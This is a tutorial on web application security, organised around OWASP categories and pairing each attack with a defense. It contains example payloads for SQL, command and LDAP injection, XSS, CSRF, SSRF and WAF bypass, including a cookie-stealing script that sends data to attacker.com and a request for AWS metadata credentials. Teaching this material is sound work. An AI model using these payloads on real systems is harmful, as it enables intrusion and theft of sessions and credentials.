How Web Applications Work

Understanding the HTTP request-response cycle is fundamental to web security:

Client Request: GET /login HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 Cookie: session=abc123 Server Response: HTTP/1.1 200 OK Content-Type: text/html Set-Cookie: session=xyz789; HttpOnly

Client-Server Model Components

  • Client (Browser): Sends HTTP requests, executes JavaScript, renders HTML/CSS
  • Web Server: Handles requests, serves static content (Apache, Nginx, IIS)
  • Application Server: Executes business logic (PHP, Python, Java, Node.js)
  • Database: Stores and retrieves persistent data (MySQL, PostgreSQL, MongoDB)
Security Implication: Each layer presents unique attack surfaces. Understanding data flow between components is crucial for identifying vulnerabilities.

A01: Broken Access Control

Access control enforces policy such that users cannot act outside of their intended permissions. Common failures include:

Insecure Direct Object Reference (IDOR)

Vulnerable URL: https://bank.com/account?id=12345 Attack: https://bank.com/account?id=12346 ← Access another user's account

Privilege Escalation

  • Vertical: Regular user accessing admin functions
  • Horizontal: User accessing another user's resources at same privilege level

Forced Browsing

Direct access to admin panel without authentication: https://site.com/admin/ https://site.com/config.php https://site.com/backup/database.sql
Testing Tip: Always test with multiple user roles. Try accessing resources by manipulating IDs, changing HTTP methods (POST to GET), or removing authentication tokens.

A02: Cryptographic Failures

Previously known as "Sensitive Data Exposure," this category covers failures related to cryptography that lead to sensitive data disclosure:

Common Cryptographic Failures

  • Transmitting data in clear text: HTTP instead of HTTPS, FTP instead of SFTP
  • Using old/weak cryptographic algorithms: MD5, SHA1, DES, RC4
  • Poor key management: Hardcoded keys, weak key generation, improper storage
  • Missing encryption: Storing passwords in plaintext, unencrypted database backups
  • Weak cipher suites: TLS 1.0/1.1, export-grade ciphers

Example: Weak Password Storage

BAD: Plaintext password = "MyPassword123" BAD: Simple hashing (no salt) password = md5("MyPassword123") GOOD: Proper hashing with salt password = bcrypt("MyPassword123", salt=auto, cost=12)
Defense: Use TLS 1.2+ for all data in transit, strong algorithms (AES-256, SHA-256+), and modern password hashing (bcrypt, Argon2, scrypt) with proper salting.

A03: Injection Attacks

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query:

SQL Injection

Vulnerable Code: query = "SELECT * FROM users WHERE username='" + user_input + "'" Attack Input: admin' OR '1'='1 Resulting Query: SELECT * FROM users WHERE username='admin' OR '1'='1' Result: Bypasses authentication, returns all users

Command Injection

Vulnerable Code: system("ping -c 4 " + user_ip) Attack Input: 8.8.8.8; cat /etc/passwd Resulting Command: ping -c 4 8.8.8.8; cat /etc/passwd Result: Executes arbitrary system commands

LDAP Injection

Attack Input: *)(uid=*))(|(uid=* Result: Bypasses LDAP authentication filters
Key Defense: Use parameterized queries (prepared statements), input validation, and principle of least privilege for database accounts.

SQL Injection Deep Dive

UNION-Based SQLi

Original: SELECT title, content FROM articles WHERE id=5 Attack: 5 UNION SELECT username, password FROM users-- Result: Extracts data from different tables

Blind SQL Injection

When application doesn't display errors or data, use true/false conditions:

Boolean-Based: ' AND 1=1-- (page loads normally - TRUE) ' AND 1=2-- (page behaves differently - FALSE) Time-Based: ' AND SLEEP(5)-- (page delays 5 seconds if vulnerable)

A07: Cross-Site Scripting (XSS)

XSS attacks inject malicious scripts into trusted websites, executing in victims' browsers:

Reflected XSS

Vulnerable Code: echo "Search results for: " + $_GET['query'] Attack URL: site.com/search?query=<script>alert(document.cookie)</script> Result: Script executes in victim's browser

Stored XSS (Persistent)

Attack: Post comment containing malicious script <script> fetch('https://attacker.com/steal?cookie=' + document.cookie) </script> Result: Every user viewing the comment executes the script

DOM-Based XSS

Vulnerable JavaScript: document.getElementById('welcome').innerHTML = "Hello " + window.location.hash.substring(1); Attack URL: site.com/#<img src=x onerror=alert('XSS')>
Defense: Output encoding, Content Security Policy (CSP), HTTPOnly cookies, input validation, and using textContent instead of innerHTML.

Cross-Site Request Forgery (CSRF)

CSRF tricks authenticated users into executing unwanted actions on web applications:

How CSRF Works

  1. Victim is logged into trusted site (bank.com)
  2. Attacker tricks victim into visiting malicious site
  3. Malicious site sends forged request to bank.com
  4. Browser automatically includes authentication cookies
  5. Bank processes request as legitimate

Example Attack

Malicious HTML on attacker's site: <img src="https://bank.com/transfer?to=attacker&amount=10000" /> Or via JavaScript: <script> fetch('https://bank.com/transfer', { method: 'POST', credentials: 'include', body: 'to=attacker&amount=10000' }); </script>

CSRF Token Bypass Techniques

  • Token not validated: Server accepts request without token
  • Token validation on presence: Empty token parameter accepted
  • HTTP method tampering: POST endpoint also accepts GET
  • Token reuse: Static token used across sessions
Defense: Implement anti-CSRF tokens (synchronized token pattern), SameSite cookie attribute, verify Origin/Referer headers, and require re-authentication for sensitive actions.

A08: Server-Side Request Forgery (SSRF)

SSRF forces the server to make requests to unintended locations, potentially accessing internal resources:

Basic SSRF Attack

Vulnerable Feature: Image upload from URL POST /upload url=http://192.168.1.1/admin Server fetches: Internal admin panel (not accessible from internet) Attacker receives: Contents of internal admin page

SSRF Attack Targets

  • Internal Services: localhost:6379 (Redis), localhost:9200 (Elasticsearch)
  • Cloud Metadata: http://169.254.169.254/latest/meta-data/ (AWS credentials)
  • Internal Network Scanning: Discover internal IPs and services
  • File Protocol: file:///etc/passwd (local file access)

Advanced SSRF Example

AWS Metadata Theft: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin Response: { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." } Result: Attacker obtains AWS credentials from server's IAM role
Defense: Whitelist allowed protocols and domains, block access to private IP ranges, disable unnecessary URL schemas (file://, gopher://), and implement network segmentation.

Web Application Firewalls (WAF)

WAFs monitor, filter, and block HTTP traffic to and from web applications:

WAF Functionality

  • Signature-based detection: Known attack patterns (SQL keywords, XSS payloads)
  • Anomaly detection: Unusual request patterns or parameters
  • Rate limiting: Prevents brute force and DoS attacks
  • Virtual patching: Protects vulnerable apps before code fixes deployed

WAF Bypass Techniques

Original Payload: <script>alert(1)</script> Encoding Bypass: - URL encode: %3Cscript%3Ealert(1)%3C/script%3E - Double encode: %253Cscript%253E - Unicode: \u003cscript\u003e Case Manipulation: <ScRiPt>alert(1)</sCrIpT> NULL Byte Injection: <script%00>alert(1)</script> Comment Injection (SQL): SE/**/LECT * FROM users WH/**/ERE 1=1

Popular WAF Solutions

Cloud WAFs: Cloudflare, AWS WAF, Akamai, Imperva
On-Premise: ModSecurity, F5 BIG-IP, Barracuda WAF
Note: WAFs are defense-in-depth, not a replacement for secure coding practices. They can be bypassed and should complement, not replace, proper input validation.

Bug Bounty Programs

Organizations pay security researchers to find and responsibly disclose vulnerabilities:

Major Bug Bounty Platforms

HackerOne

Leading platform with Fortune 500 programs

Average payout: $500-$10,000+

Bugcrowd

Large variety of public and private programs

Community-driven platform

Synack

Invite-only, vetted researchers

Premium programs

Intigriti

European-focused platform

Growing program base

Responsible Disclosure Process

  1. Find vulnerability: Test within program scope and rules
  2. Document thoroughly: Steps to reproduce, impact, proof-of-concept
  3. Submit report: Clear, professional, actionable
  4. Do not disclose publicly: Wait for fix and agreed disclosure timeline
  5. Receive reward: Bounty payment after validation and fix
Getting Started: Begin with VDP (Vulnerability Disclosure Programs) that don't pay but allow practice. Focus on understanding one vulnerability class deeply before moving to others.
